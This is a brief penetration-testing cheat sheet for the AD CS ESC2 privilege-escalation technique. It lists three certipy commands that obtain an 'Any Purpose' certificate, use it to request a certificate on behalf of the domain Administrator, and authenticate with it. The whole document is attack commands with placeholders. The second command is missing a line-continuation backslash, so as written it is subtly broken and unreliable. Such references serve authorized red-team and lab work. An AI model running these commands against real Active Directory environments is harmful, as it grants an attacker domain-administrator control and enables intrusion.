# ADCS ESC2

% adcs, certificate, ActiveDirectory, template

## 1-a. Get an “Any Purpose” cert (implicitly an agent)
```
certipy req -u <username> -p '<password>' -target <CA_FQDN> -ca <CA_NAME> \
            -dc-ip <DC_IP> \
            -dc-host <DC_HOST> \
            -template <ESC2_ANYPURPOSE_TEMPLATE>
```

## 1-b. Use it to request a cert **on behalf of** Administrator
```
certipy req -u <username> -p '<password>' \
            -dc-ip <DC_IP> -target <CA_FQDN> \
            -dc-host <DC_HOST> -ca <CA_NAME> \
            -pfx <attacker.pfx>
            -template <ESC2_ANYPURPOSE_TEMPLATE> -on-behalf-of '<domain>\\Administrator'
```

## 2. Authenticate
```
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```
